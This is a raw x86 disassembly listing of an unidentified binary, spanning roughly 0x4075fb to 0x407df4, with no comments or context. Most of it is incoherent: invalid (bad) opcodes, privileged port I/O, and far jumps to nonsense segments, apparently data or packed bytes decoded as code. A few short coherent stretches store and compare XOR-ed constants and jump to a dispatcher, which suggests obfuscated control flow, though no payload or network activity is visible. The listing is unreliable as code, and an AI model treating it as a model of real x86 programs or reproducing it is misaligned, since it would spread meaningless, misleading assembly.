  4075fb:	lea    esi,[edi]
  4075fd:	fimul  DWORD PTR [edx-0x5c]
  407600:	ss cmp esi,eax
  407603:	clc    
  407604:	or     BYTE PTR [edx],0xf2
  407607:	and    al,0xa8
  407609:	inc    ebx
  40760a:	inc    edx
  40760b:	clc    
  40760c:	dec    esp
  40760d:	test   eax,0x2224c1dd
  407612:	sar    BYTE PTR [edi],1
  407614:	fadd   DWORD PTR [eax]
  407616:	push   0x6ddce085
  40761b:	xchg   DWORD PTR [edx],ebx
  40761d:	iret   
  40761e:	pop    eax
  40761f:	in     eax,0xb9
  407621:	or     DWORD PTR [edx+0x1a],ebx
  407624:	jbe    0x407687
  407626:	mov    ebp,0xdaab1280
  40762b:	mov    dh,0xb4
  40762d:	loop   0x4075bb
  40762f:	mov    bh,0x48
  407631:	push   esp
  407632:	inc    eax
  407633:	xor    DWORD PTR [edi-0x41],0xffffffc9
  407637:	aad    0x1
  407639:	mov    ah,0x5
  40763b:	test   eax,0xe9a05f36
  407640:	outs   dx,DWORD PTR ds:[si]
  407642:	add    eax,0x22ea9ffb
  407647:	inc    ebx
  407648:	inc    ebx
  407649:	dec    ebp
  40764a:	mov    ebx,0xe9047e89
  40764f:	xchg   ebx,eax
  407650:	or     eax,0x458b0000
  407655:	fadd   QWORD PTR [ebx]
  407657:	inc    ebp
  407658:	cld    
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fisttp QWORD PTR [eax-0x412291b1]
  40768f:	push   edi
  407690:	mov    esi,0xbec4bdbe
  407695:	mov    esi,0x8a8b2e2d
  40769a:	cdq    
  40769b:	cs jmp 0xcd321b5d
  4076a1:	or     eax,edx
  4076a3:	loope  0x40767e
  4076a5:	sahf   
  4076a6:	enter  0xb8e7,0x69
  4076aa:	mov    edx,DWORD PTR [ecx-0x11fe11a4]
  4076b0:	rol    DWORD PTR ds:0x727331ef,0x75
  4076b7:	mov    eax,ds:0xa3bac996
  4076bc:	push   esi
  4076bd:	fmul   DWORD PTR [ebx-0x22f02a33]
  4076c3:	imul   DWORD PTR [eax]
  4076c5:	ja     0x407695
  4076c7:	mov    ss,WORD PTR [eax]
  4076c9:	sbb    BYTE PTR [edx+eiz*1],ch
  4076cc:	stc    
  4076cd:	add    cl,BYTE PTR [edx-0x14]
  4076d0:	mov    ch,BYTE PTR [ebx-0x5f]
  4076d3:	add    bl,BYTE PTR [esi+0x1b06b86c]
  4076d9:	aaa    
  4076da:	xchg   ebx,eax
  4076db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076dc:	je     0x407742
  4076de:	fwait
  4076df:	ins    DWORD PTR es:[edi],dx
  4076e0:	inc    ebp
  4076e1:	out    0x31,eax
  4076e3:	sbb    ebx,DWORD PTR [ebx-0x689e8f9a]
  4076e9:	pop    es
  4076ea:	jle    0x4076e6
  4076ec:	inc    eax
  4076ed:	add    esp,edx
  4076ef:	jp     0x4076b8
  4076f1:	call   0x61f9:0x7d851645
  4076f8:	clc    
  4076f9:	test   cl,dl
  4076fb:	aam    0xd6
  4076fd:	test   ebx,0x3a4e8703
  407703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407704:	pop    DWORD PTR [esi]
  407706:	pop    edx
  407707:	jmp    0xb95f:0xce463011
  40770e:	bound  edi,QWORD PTR ds:0xa716bc96
  407714:	and    cl,BYTE PTR [esi+0x292f85c]
  40771a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40771b:	xchg   esp,eax
  40771c:	pop    eax
  40771d:	fdivr  DWORD PTR [edi+0x57]
  407720:	aam    0x5d
  407722:	push   cs
  407723:	cmp    BYTE PTR [ecx],bh
  407725:	and    al,0x11
  407727:	fnsave [esi-0x7dfce11b]
  40772d:	cmp    bh,cl
  40772f:	dec    ebx
  407730:	inc    esi
  407731:	push   esp
  407732:	jmp    0x4076e5
  407734:	mov    ebp,0x9348c0e1
  407739:	sub    DWORD PTR [edx-0x371ca75d],edi
  40773f:	daa    
  407740:	sub    al,0x90
  407742:	pushf  
  407743:	xchg   ebp,eax
  407744:	icebp  
  407745:	sbb    BYTE PTR [esi-0x1d0c2b25],dl
  40774b:	or     DWORD PTR [ecx+0x4f],ebx
  40774e:	(bad)  
  40774f:	test   eax,0xa8a94bf6
  407754:	mov    ebp,0x1ea164ab
  407759:	in     al,dx
  40775a:	cmp    ah,BYTE PTR [ecx+0x4f]
  40775d:	jg     0x40776c
  40775f:	cmp    ebp,DWORD PTR [edi]
  407761:	mov    edx,0x6aeee19
  407766:	jns    0x407735
  407768:	inc    ebx
  407769:	mov    ch,BYTE PTR [esi+0x5de13860]
  40776f:	mov    dl,0x5d
  407771:	sbb    dh,BYTE PTR [ebx+0x49]
  407774:	pop    edx
  407775:	(bad)  
  407777:	stc    
  407778:	das    
  407779:	pop    edx
  40777a:	push   es
  40777b:	jnp    0x407756
  40777d:	out    0xc0,al
  40777f:	xor    bh,BYTE PTR [eax]
  407781:	call   0x3222ce3a
  407786:	in     al,0x43
  407788:	dec    edi
  407789:	aam    0xd8
  40778b:	pop    edi
  40778c:	dec    edx
  40778d:	clc    
  40778e:	inc    eax
  40778f:	xor    bl,BYTE PTR [edx-0x3537d9d3]
  407795:	cli    
  407796:	inc    ebx
  407797:	mov    eax,ds:0x618180cc
  40779c:	jmp    0x3efe:0xb967f6a9
  4077a3:	int    0x10
  4077a5:	stos   DWORD PTR es:[edi],eax
  4077a6:	fst    DWORD PTR [edx]
  4077a8:	pushf  
  4077a9:	mov    cl,0xcb
  4077ab:	cmp    esp,eax
  4077ad:	(bad)  
  4077ae:	pushf  
  4077af:	ror    DWORD PTR [edx+ecx*1-0x6b],1
  4077b3:	pop    eax
  4077b4:	xor    al,0xcf
  4077b6:	add    DWORD PTR [edi-0x6b67e3ed],ebx
  4077bc:	push   ds
  4077bd:	std    
  4077be:	mov    bh,bl
  4077c0:	sar    BYTE PTR [edi+0x4e],1
  4077c3:	mov    dl,0xe2
  4077c5:	sub    DWORD PTR [edi],0x1
  4077c8:	push   0xffffffcb
  4077ca:	push   0x256e2f3d
  4077cf:	imul   ecx,DWORD PTR [edx-0x17],0x1c
  4077d3:	data16 mov al,0x12
  4077d6:	retf   
  4077d7:	mov    esp,0x48a618b9
  4077dc:	inc    ecx
  4077dd:	mov    bh,BYTE PTR [edi]
  4077df:	jns    0x40777b
  4077e1:	je     0x4077c7
  4077e3:	cld    
  4077e4:	dec    edi
  4077e5:	sbb    esi,DWORD PTR [edi+0x5db7b059]
  4077eb:	int    0x9a
  4077ed:	mov    al,ds:0x44bf6af2
  4077f2:	push   0x693ae6d8
  4077f7:	or     ecx,esi
  4077f9:	in     eax,0xdc
  4077fb:	mov    DWORD PTR [eax-0x11],ebx
  4077fe:	dec    eax
  4077ff:	mov    BYTE PTR [eax-0x7f],al
  407802:	jns    0x40783a
  407804:	inc    eax
  407805:	aaa    
  407806:	sbb    BYTE PTR [eax],0x47
  407809:	pop    eax
  40780a:	jno    0x407831
  40780c:	loop   0x4077d4
  40780e:	mov    ch,0x6f
  407810:	jl     0x40784e
  407812:	pushf  
  407813:	push   es
  407814:	js     0x4077d6
  407816:	add    al,0x5e
  407818:	jp     0x407810
  40781a:	add    DWORD PTR [edx+0x1f0032aa],ebx
  407820:	clc    
  407821:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407823:	clc    
  407824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407825:	sti    
  407826:	daa    
  407827:	pop    es
  407828:	js     0x4077fb
  40782a:	fcom   QWORD PTR [eax+0x32]
  40782d:	pushf  
  40782e:	xchg   edi,eax
  40782f:	or     al,0x77
  407831:	or     DWORD PTR [edx],ebx
  407833:	lahf   
  407834:	sbb    BYTE PTR [ebx],0x3a
  407837:	and    eax,0x60fb3429
  40783c:	push   ebx
  40783d:	mov    dh,0xf
  40783f:	in     eax,dx
  407840:	mov    ecx,0xba038c22
  407845:	jno    0x4078be
  407847:	lea    esp,[ebx-0x41f0153b]
  40784d:	int3   
  40784e:	pop    esi
  40784f:	cmp    eax,0x2537aa8c
  407854:	ficom  DWORD PTR [ebp-0x6c546eb7]
  40785a:	jg     0x40781d
  40785c:	sub    eax,0x8013e090
  407861:	ins    BYTE PTR es:[edi],dx
  407862:	push   esi
  407863:	cmp    DWORD PTR [ecx-0x197b829b],0xffffffb8
  40786a:	mov    dh,0xda
  40786c:	cs jnp 0x4078ab
  40786f:	lds    ecx,FWORD PTR [ecx]
  407871:	ret    
  407872:	pop    edi
  407873:	lahf   
  407874:	inc    DWORD PTR ss:[edx+ecx*4+0x7a]
  407879:	std    
  40787a:	pop    eax
  40787b:	xchg   edx,eax
  40787c:	fsub   QWORD PTR [ecx-0x292d3f4c]
  407882:	aad    0x60
  407884:	scas   al,BYTE PTR es:[edi]
  407885:	loopne 0x407832
  407887:	ret    
  407888:	adc    cl,BYTE PTR [ecx+0x286603b9]
  40788e:	push   esp
  40788f:	mov    eax,0xddb36290
  407894:	mov    eax,ds:0xa8788501
  407899:	mul    dl
  40789b:	mov    bh,BYTE PTR [ebx]
  40789d:	inc    esi
  40789e:	stos   BYTE PTR es:[edi],al
  40789f:	sbb    BYTE PTR [ebx-0x3cdff474],dl
  4078a5:	jg     0x407886
  4078a7:	jmp    0x25bb:0xcaf2b5ca
  4078ae:	fwait
  4078af:	cmp    al,0xee
  4078b1:	cmp    DWORD PTR [edi+0x5f0f21cd],edi
  4078b7:	sbb    DWORD PTR [ebp+0x6d],ecx
  4078ba:	inc    edi
  4078bb:	jge    0x4078d4
  4078bd:	out    dx,eax
  4078be:	outs   dx,DWORD PTR ds:[esi]
  4078bf:	mov    dl,BYTE PTR [edx+0x43d0ebc9]
  4078c5:	loopne 0x4078d3
  4078c7:	ja     0x407887
  4078c9:	loope  0x407932
  4078cb:	or     eax,0x90c28722
  4078d0:	out    0x42,al
  4078d2:	lea    edx,[eax+eiz*1]
  4078d5:	adc    DWORD PTR [edi+0x7],ebp
  4078d8:	ror    DWORD PTR [ebx+0xe35ea1],1
  4078de:	arpl   WORD PTR [eax],cx
  4078e0:	push   ss
  4078e1:	leave  
  4078e2:	sbb    BYTE PTR [eax+0x70e24997],al
  4078e8:	sbb    BYTE PTR [edi-0x34],al
  4078eb:	std    
  4078ec:	cpuid  
  4078ee:	fsubr  QWORD PTR [edi-0x22957093]
  4078f4:	jle    0x407883
  4078f6:	mov    edx,0x6d7c5af0
  4078fb:	nop
  4078fc:	pop    ds
  4078fd:	dec    ebp
  4078fe:	(bad)  [edx+0x68199ed]
  407904:	(bad)  
  407905:	add    eax,0x1c4dbc84
  40790a:	sub    BYTE PTR [ebp-0x42e81bee],bh
  407910:	retf   
  407911:	scas   al,BYTE PTR es:[edi]
  407912:	dec    edi
  407913:	xchg   ebx,eax
  407914:	leave  
  407915:	push   edx
  407916:	cs jmp 0x67c:0x4491c40
  40791e:	or     al,0x3d
  407920:	js     0x4078ab
  407922:	iret   
  407923:	es in  eax,dx
  407925:	pop    edi
  407926:	loopne 0x407962
  407928:	cli    
  407929:	cli    
  40792a:	dec    esi
  40792b:	adc    edi,0x9dc7591
  407931:	lods   eax,DWORD PTR ds:[esi]
  407932:	push   eax
  407933:	mov    gs,WORD PTR [ebp+0x39c4d9ae]
  407939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40793a:	fmul   st(3),st
  40793c:	popa   
  40793d:	adc    al,0x5a
  40793f:	jb     0x4078e3
  407941:	xor    eax,0x39164fa6
  407946:	dec    eax
  407947:	or     bh,BYTE PTR [ebx+eiz*8+0x78]
  40794b:	pop    ebp
  40794c:	sbb    ecx,ebx
  40794e:	and    edx,ebx
  407950:	add    al,0x6b
  407952:	ins    DWORD PTR es:[edi],dx
  407953:	sub    al,0xa2
  407955:	adc    al,0x7
  407957:	add    ecx,DWORD PTR [esp+esi*8-0x3d]
  40795b:	pop    ebx
  40795c:	js     0x4079c7
  40795e:	stos   BYTE PTR es:[edi],al
  40795f:	mov    ch,0x4b
  407961:	retf   
  407962:	and    ecx,DWORD PTR [eax]
  407964:	lds    ebp,FWORD PTR [ebx-0x5433da80]
  40796a:	or     DWORD PTR ds:0x1a7c4530,0xaf24dc81
  407974:	add    ecx,ecx
  407976:	rcl    esi,1
  407978:	jns    0x407970
  40797a:	cdq    
  40797b:	jmp    0x4079f4
  40797d:	jp     0x40796d
  40797f:	fisubr WORD PTR [edx+0x51773212]
  407985:	push   cs
  407986:	and    BYTE PTR [edi-0x67],bh
  407989:	mov    ch,0x8e
  40798b:	repnz cli 
  40798d:	mov    edi,0xfb4e47bd
  407992:	pusha  
  407993:	xchg   esi,eax
  407994:	adc    eax,0x9b066bb5
  407999:	popf   
  40799a:	fistp  WORD PTR [ecx+ebp*4+0x5f]
  40799e:	std    
  40799f:	call   0xbef9:0xd736c9b9
  4079a6:	and    al,0x2c
  4079a8:	(bad)  
  4079aa:	mov    dl,0x93
  4079ac:	push   0xd
  4079ae:	xchg   BYTE PTR [edi],ah
  4079b0:	pop    es
  4079b1:	cld    
  4079b2:	pushf  
  4079b3:	shl    BYTE PTR [ebx+0x6e],0x39
  4079b7:	bound  eax,QWORD PTR [edi-0x54cd905e]
  4079bd:	pop    es
  4079be:	cmp    al,al
  4079c0:	inc    edi
  4079c1:	ja     0x407a30
  4079c3:	mov    ?,WORD PTR [edx-0x71]
  4079c6:	push   0x62c80de4
  4079cb:	push   ss
  4079cc:	sub    edi,DWORD PTR [eax-0x71]
  4079cf:	out    dx,eax
  4079d0:	cli    
  4079d1:	cdq    
  4079d2:	and    dl,BYTE PTR [eax]
  4079d4:	dec    edi
  4079d5:	cs jne 0x4079d9
  4079d8:	out    0xac,al
  4079da:	hlt    
  4079db:	mov    ecx,0xe38af1be
  4079e0:	ins    WORD PTR es:[edi],dx
  4079e2:	imul   esp,DWORD PTR [ebp+0x539b8793],0xa1194dc9
  4079ec:	popf   
  4079ed:	fwait
  4079ee:	in     al,dx
  4079ef:	jp     0x407a53
  4079f1:	std    
  4079f2:	retf   
  4079f3:	mov    edx,0x301c613b
  4079f8:	out    0x0,eax
  4079fa:	loop   0x4079d9
  4079fc:	inc    ecx
  4079fd:	sub    BYTE PTR [edi+0x2d],dl
  407a00:	xchg   esp,eax
  407a01:	mov    ch,0x32
  407a03:	sub    eax,0xc86f0b97
  407a08:	adc    edx,eax
  407a0a:	dec    ebx
  407a0b:	pop    esi
  407a0c:	sub    bh,BYTE PTR [esp+eiz*2+0x29]
  407a10:	aam    0xb7
  407a12:	inc    ecx
  407a13:	and    eax,0x8ecd2389
  407a18:	(bad)  
  407a19:	jp     0x4079a6
  407a1b:	push   ebp
  407a1c:	test   al,0xc1
  407a1e:	loopne 0x407a22
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	jg     0x407a23
  407a80:	lock iret 
  407a82:	mov    ebp,0xbdbebe5d
  407a87:	les    edi,FWORD PTR [esi-0x7c9ef242]
  407a8d:	ret    
  407a8e:	(bad)  
  407a90:	lds    ebp,FWORD PTR [ecx]
  407a92:	or     DWORD PTR [ebx],ecx
  407a94:	mov    ebp,0x34587caa
  407a99:	jle    0x407a9a
  407a9b:	adc    BYTE PTR [ebx-0x74],al
  407a9e:	pop    edx
  407a9f:	mov    esi,0xb9fec65
  407aa4:	cmp    al,0x39
  407aa6:	mov    cl,0xed
  407aa8:	repnz xchg esi,eax
  407aaa:	or     DWORD PTR [ebx+eax*1],eax
  407aad:	xchg   esi,eax
  407aae:	mov    ?,WORD PTR [edx+0x6a09875e]
  407ab4:	rcr    DWORD PTR [eax-0x6a],0xa8
  407ab8:	cmp    BYTE PTR [edx+0x136aa892],ah
  407abe:	mov    edi,0x8a3ef7a2
  407ac3:	cdq    
  407ac4:	pushf  
  407ac5:	push   ebx
  407ac6:	test   ah,bl
  407ac8:	fld    DWORD PTR [edx+0x5c]
  407acb:	(bad)  
  407acc:	lods   eax,DWORD PTR ds:[esi]
  407acd:	cmp    DWORD PTR [esi+0x67ea1182],edi
  407ad3:	pop    ss
  407ad4:	scas   al,BYTE PTR es:[edi]
  407ad5:	add    bh,BYTE PTR ds:[edx+0x59]
  407ad9:	ror    DWORD PTR [eax-0x16c59573],1
  407adf:	cmp    DWORD PTR [esi],ebp
  407ae1:	call   0x763af49e
  407ae6:	sbb    BYTE PTR [esi],bl
  407ae8:	sbb    cl,BYTE PTR [esi+esi*1+0x27b209b8]
  407aef:	pop    edi
  407af0:	or     DWORD PTR [ebx-0x16],ecx
  407af3:	mov    esi,0x54bee4a6
  407af8:	mov    BYTE PTR [esi+ecx*1],bh
  407afb:	retf   
  407afc:	test   BYTE PTR [ebp+0x24],0xc2
  407b00:	arpl   WORD PTR [eax+0x2a],cx
  407b03:	ror    BYTE PTR [eax+ebp*2-0x128dba18],0x24
  407b0b:	mov    BYTE PTR [ecx+0x37],ch
  407b0e:	(bad)  
  407b0f:	pop    ebx
  407b10:	(bad)  
  407b11:	clc    
  407b12:	pop    edi
  407b13:	mov    ds:0xcad00909,eax
  407b18:	xchg   ebp,eax
  407b19:	ret    
  407b1a:	mov    esi,0xd2d518e7
  407b1f:	scas   al,BYTE PTR es:[edi]
  407b20:	inc    edx
  407b21:	or     cl,BYTE PTR [edx]
  407b23:	(bad)  
  407b24:	(bad)  
  407b26:	(bad)  
  407b27:	sbb    esi,DWORD PTR [edx-0x355bfa7c]
  407b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b2e:	popa   
  407b2f:	xor    eax,0xd91d79f0
  407b34:	add    DWORD PTR [ecx-0x1be84b34],esp
  407b3a:	jns    0x407b92
  407b3c:	imul   edi,ebx,0x2e
  407b3f:	xor    esp,DWORD PTR [ebx]
  407b41:	mov    dl,0xa6
  407b43:	dec    esp
  407b44:	or     dh,ah
  407b46:	loope  0x407ad1
  407b48:	sub    eax,0x9f4e143e
  407b4d:	xchg   DWORD PTR [eax+0x5e],ebx
  407b50:	je     0x407ad6
  407b52:	sub    DWORD PTR [edi],0xffffff8a
  407b55:	push   es
  407b56:	jg     0x407b93
  407b58:	retf   
  407b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b5a:	push   0xffffffcb
  407b5c:	shl    DWORD PTR [eax-0x3d411740],cl
  407b62:	loop   0x407b96
  407b64:	call   0x14fb6856
  407b69:	cmp    eax,0xd35ddc70
  407b6e:	mov    ecx,0x50a9ddb2
  407b73:	mov    dl,0x95
  407b75:	mov    ds:0xdfe4dd3,al
  407b7a:	repz test BYTE PTR [edx],bh
  407b7d:	inc    ecx
  407b7e:	(bad)  
  407b7f:	pop    edi
  407b80:	scas   eax,DWORD PTR es:[edi]
  407b81:	push   ss
  407b82:	mov    al,0x8b
  407b84:	stc    
  407b85:	jne    0x407b97
  407b87:	in     al,dx
  407b88:	sub    al,al
  407b8a:	jo     0x407b73
  407b8c:	xor    dh,dh
  407b8e:	pop    ebp
  407b8f:	stos   BYTE PTR es:[edi],al
  407b90:	in     al,dx
  407b91:	enter  0x6ad6,0xf5
  407b95:	lods   al,BYTE PTR ds:[esi]
  407b96:	clc    
  407b97:	jno    0x407b26
  407b99:	mov    bh,0x9d
  407b9b:	sbb    eax,0xfe07e768
  407ba0:	aam    0x83
  407ba2:	push   cs
  407ba3:	call   0xc068:0xc31f4d39
  407baa:	pop    edi
  407bab:	loopne 0x407bd5
  407bad:	lock jae 0x407b5d
  407bb0:	cmp    ebx,DWORD PTR [eax+0x41074d5c]
  407bb6:	stos   BYTE PTR es:[edi],al
  407bb7:	xchg   edx,eax
  407bb8:	pop    ebp
  407bb9:	and    DWORD PTR [ebx+0x6e537df7],esp
  407bbf:	dec    ebx
  407bc0:	mov    ecx,0x89bbcad8
  407bc5:	inc    ebp
  407bc6:	pop    edx
  407bc7:	xchg   edx,eax
  407bc8:	jp     0x407b9d
  407bca:	sbb    BYTE PTR [esi+0x14a048ea],0x3f
  407bd1:	pop    ecx
  407bd2:	lds    ecx,FWORD PTR [ebx]
  407bd4:	leave  
  407bd5:	popf   
  407bd6:	sbb    BYTE PTR [edi+0x64],bl
  407bd9:	jmp    0x407c18
  407bdb:	pop    edi
  407bdc:	xrelease xchg DWORD PTR [esi+0x50],esi
  407be0:	mov    ecx,0xd531086c
  407be5:	mov    edi,0x1e52f6eb
  407bea:	fidiv  WORD PTR [edi-0x42]
  407bed:	outs   dx,BYTE PTR ds:[esi]
  407bee:	inc    edx
  407bef:	ja     0x407bee
  407bf1:	mov    edx,0x1c8bae0a
  407bf6:	mov    esp,0x813e7d3b
  407bfb:	pop    WORD PTR cs:[ebx]
  407bff:	in     eax,dx
  407c00:	mov    ?,WORD PTR [ebx+edx*4-0x438f7f50]
  407c07:	xchg   BYTE PTR [edx],dh
  407c09:	mov    bl,0x10
  407c0b:	ja     0x407bbe
  407c0d:	dec    esi
  407c0e:	popf   
  407c0f:	lds    ebx,FWORD PTR [ecx+0x41a7c912]
  407c15:	test   al,0x6
  407c17:	por    mm5,QWORD PTR [ebx+0x76]
  407c1b:	cli    
  407c1c:	retf   
  407c1d:	mov    eax,ds:0xc9ef7923
  407c22:	test   dh,dh
  407c24:	mov    eax,ds:0x8137a1b7
  407c29:	inc    ecx
  407c2a:	pop    es
  407c2b:	fnsave [edx]
  407c2d:	mov    cl,0xb2
  407c2f:	fsubr  DWORD PTR [ecx-0x8]
  407c32:	call   0x2efbfccb
  407c37:	mov    ecx,0x827a03ec
  407c3c:	cld    
  407c3d:	ds icebp 
  407c3f:	and    bh,BYTE PTR [esi+0x43]
  407c42:	jge    0xa216248a
  407c48:	and    ecx,ebp
  407c4a:	int3   
  407c4b:	retf   0x3046
  407c4e:	push   0x995b1ab8
  407c53:	mov    dh,0x9b
  407c55:	push   ds
  407c56:	les    eax,FWORD PTR [eax+eax*1-0x5a]
  407c5a:	sbb    cl,BYTE PTR [edi]
  407c5c:	sub    DWORD PTR [edx-0x25dfd037],eax
  407c62:	jo     0x407cb5
  407c64:	ret    
  407c65:	mov    eax,ds:0x882d98bb
  407c6a:	and    ebx,esi
  407c6c:	add    ebp,0xffffffce
  407c6f:	mov    bh,dl
  407c71:	inc    ecx
  407c72:	test   ah,0xec
  407c75:	cld    
  407c76:	inc    esp
  407c77:	outs   dx,DWORD PTR ds:[esi]
  407c78:	adc    DWORD PTR [esi],0x54
  407c7b:	repnz cli 
  407c7d:	mov    ds:0x404b10a0,al
  407c82:	jmp    0x31e3:0x644cc732
  407c89:	pop    ecx
  407c8a:	mov    ebx,0x9c260801
  407c8f:	in     al,dx
  407c90:	ror    DWORD PTR [edx],0x43
  407c93:	je     0x407c4b
  407c95:	(bad)  
  407c96:	repnz (bad) 
  407c98:	(bad)  
  407c9a:	outs   dx,BYTE PTR ds:[esi]
  407c9b:	mov    ebp,0x245e95c4
  407ca0:	sbb    BYTE PTR [ecx],al
  407ca2:	loop   0x407c71
  407ca4:	dec    edx
  407ca5:	xchg   ebx,eax
  407ca6:	das    
  407ca7:	test   DWORD PTR [edx],esp
  407ca9:	mov    eax,ds:0x3d246460
  407cae:	pop    es
  407caf:	mov    eax,0xe77a748f
  407cb4:	das    
  407cb5:	sbb    eax,0xb06dd001
  407cba:	jmp    0x407cc7
  407cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cbd:	fistp  DWORD PTR [edx-0x3eb94222]
  407cc3:	add    al,0x56
  407cc5:	sar    DWORD PTR [ebp+0x131e50f6],1
  407ccb:	imul   esp,DWORD PTR [edx],0x906e1bd7
  407cd1:	repz test eax,0x1e67a8a4
  407cd7:	or     al,BYTE PTR [edi+0x1e2e0abe]
  407cdd:	hlt    
  407cde:	out    dx,al
  407cdf:	mov    esi,0xb5938948
  407ce4:	fstp   TBYTE PTR [ecx-0x53]
  407ce7:	cmp    al,0x45
  407ce9:	scas   eax,DWORD PTR es:[edi]
  407cea:	cmc    
  407ceb:	jl     0x407cd2
  407ced:	stos   BYTE PTR es:[edi],al
  407cee:	scas   eax,DWORD PTR es:[edi]
  407cef:	jg     0x407d4d
  407cf1:	mov    BYTE PTR [ebp+0x2c1e70f2],ah
  407cf7:	or     al,BYTE PTR [eax]
  407cf9:	cmc    
  407cfa:	jp     0x407c96
  407cfc:	pop    edi
  407cfd:	lea    edx,[ecx+0x70]
  407d00:	xchg   ecx,eax
  407d01:	loopne 0x407cfe
  407d03:	or     eax,0x898bfeb5
  407d08:	popa   
  407d09:	dec    esp
  407d0a:	fadd   st,st(3)
  407d0c:	or     al,0x7d
  407d0e:	in     eax,0xdc
  407d10:	sbb    eax,0xbdcd5d52
  407d15:	inc    ebp
  407d16:	xchg   ebx,eax
  407d17:	test   BYTE PTR [eax+0x3893c7ad],0x4b
  407d1e:	xor    eax,0xbb391140
  407d23:	jmp    0x407ce4
  407d25:	inc    ebx
  407d26:	lahf   
  407d27:	leave  
  407d28:	xchg   ebp,eax
  407d29:	xor    BYTE PTR [esi+0x2a],0x96
  407d2d:	mov    eax,0x16523ea
  407d32:	cmp    BYTE PTR [ebx+0x4c],dl
  407d35:	shl    BYTE PTR [edi],1
  407d37:	mov    es,WORD PTR [edi]
  407d39:	push   edx
  407d3a:	and    al,0xc2
  407d3c:	cs iret 
  407d3e:	je     0x407db2
  407d40:	pop    edi
  407d41:	nop
  407d42:	std    
  407d43:	lahf   
  407d44:	(bad)  
  407d45:	popa   
  407d46:	scas   al,BYTE PTR es:[edi]
  407d47:	adc    eax,0xd5af08df
  407d4c:	mov    edi,0x1355a97d
  407d51:	test   al,0xda
  407d53:	push   ds
  407d54:	xor    DWORD PTR [esi-0x62bde48b],edi
  407d5a:	in     eax,dx
  407d5b:	jg     0x407d70
  407d5d:	jmp    0x72fb85ef
  407d62:	inc    edx
  407d63:	and    BYTE PTR [ecx-0x53f8fa68],bl
  407d69:	sbb    ch,cl
  407d6b:	mov    esi,0x11feca7c
  407d70:	cmp    ch,BYTE PTR [eax-0x66668dba]
  407d76:	repz mov dl,0xaa
  407d79:	adc    al,0xac
  407d7b:	pusha  
  407d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d7d:	cmp    ah,BYTE PTR [edi-0x665b5b83]
  407d83:	aaa    
  407d84:	(bad)  
  407d85:	xchg   ebp,eax
  407d86:	sbb    eax,0xe81fc9b7
  407d8b:	sbb    eax,0xf9b08b94
  407d90:	or     BYTE PTR [ecx+0x286c086e],cl
  407d96:	jbe    0x407d1b
  407d98:	jmp    0x407da4
  407d9a:	test   DWORD PTR [ebx],ecx
  407d9c:	mov    ds:0xa79e7910,al
  407da1:	pop    es
  407da2:	mov    ebp,0x2da1f5e1
  407da7:	shr    BYTE PTR [edi],1
  407da9:	aas    
  407daa:	jl     0x407de4
  407dac:	scas   al,BYTE PTR es:[edi]
  407dad:	cmp    al,0xf4
  407daf:	cmp    al,0x6d
  407db1:	xor    al,0x4b
  407db3:	jge    0x407d57
  407db5:	and    eax,eax
  407db7:	inc    esi
  407db8:	mov    ds:0xfda905a5,eax
  407dbd:	leave  
  407dbe:	add    bh,BYTE PTR [ebx+0x4a]
  407dc1:	cmp    al,0x66
  407dc3:	ret    
  407dc4:	xrelease xchg DWORD PTR [ebx],edi
  407dc7:	jmp    0x1f28:0x8ff3d2ea
  407dce:	(bad)  
  407dcf:	sbb    BYTE PTR [esi+0x40],bh
  407dd2:	dec    edi
  407dd3:	outs   dx,BYTE PTR ds:[esi]
  407dd4:	pop    ecx
  407dd5:	xchg   ebx,eax
  407dd6:	mov    ds:0x2f190d68,al
  407ddb:	adc    DWORD PTR [eax-0x460182d0],edx
  407de1:	je     0x407dff
  407de3:	push   ebx
  407de4:	mov    bl,0x43
  407de6:	cmp    BYTE PTR [bp+si],0x3a
  407dea:	mov    ecx,0xef1a9654
  407def:	fs or  al,0xbb
  407df2:	dec    ebx
  407df3:	pop    ebx
  407df4:	shl    ch,0xca
